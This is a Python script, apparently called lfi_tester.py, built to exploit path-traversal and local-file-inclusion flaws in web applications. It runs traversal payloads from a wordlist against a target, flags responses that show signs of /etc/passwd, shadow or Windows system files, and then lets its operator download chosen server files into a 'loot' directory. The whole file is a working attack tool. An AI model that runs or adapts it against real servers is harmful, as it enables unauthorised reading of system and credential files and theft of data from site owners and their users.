#!/usr/bin/env python3
import sys, json, requests, re, os

def find_vuln_url(target_url, headers):
    with open('traversal.txt', 'r') as f:
        payloads = f.read().splitlines()
    for payload in payloads:
        url = target_url + payload
        if re.search(r'root|shadow|boot.ini|ntldr|system32|windows|SAM|SECURITY|phpinfo\(\)', requests.get(url, headers=headers).text):
            return url
    print("No vulnerable URL found")
    return None

def download_file(url, headers, payload):
    with open(f'loot/{re.search(r"(/[^/]+)+", payload).group(0).replace("/", "_")}', 'wb') as f:
        f.write(requests.get(url+payload, headers=headers).content)
    print(f"Downloaded {payload}")

def main():
    target_url = sys.argv[1]
    headers = {}
    if len(sys.argv) >= 3 and sys.argv[2] == '-H':
        try:
            headers = json.loads(sys.argv[3])
        except:
            print("Failed to parse headers")
            sys.exit()

    vuln_url = find_vuln_url(target_url, headers)
    if vuln_url:
        print(f"Vulnerable URL found: {vuln_url}")
    else:
        sys.exit()

    file_list = []
    choice = input("\nDo you want to try including a file to download? [Y/n]: ").strip().lower()
    if not choice or choice == 'y':
        user_vuln_url = input(f"\nURL to target (e.g., [http://example.com/?file=../..//etc/passwd] -> [http://example.com/?file=../../]):\n> ").strip()
        while True:
            if file_list:
                print("\nFiles to download:")
                for i, f in enumerate(file_list):
                    print(f"{i}: {f}")
            # NOTE: target URL must be modified by the user, or else user defined download file does not work
            filename = input(f"Filepath to include: ")
            if not filename:
                continue
            file_list.append(filename)
            print("\nFiles to download:")
            for i, f in enumerate(file_list):
                print(f"{i}: {f}")
            if file_list:
                while True:
                    index = input("Enter the index of the file you want to download: ")
                    if index.isdigit() and int(index) in range(len(file_list)):
                        download_file(user_vuln_url, headers, file_list[int(index)])
                        break
                    else:
                        print("Invalid index")
            else:
                print("Empty list")
    else:
        sys.exit()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 lfi_tester.py <target_url> [-H '{\"User-Agent\": \"Mozilla/5.0\", \"Accept-Encoding\": \"gzip, deflate\", ... }']")
        sys.exit()
        
    main()
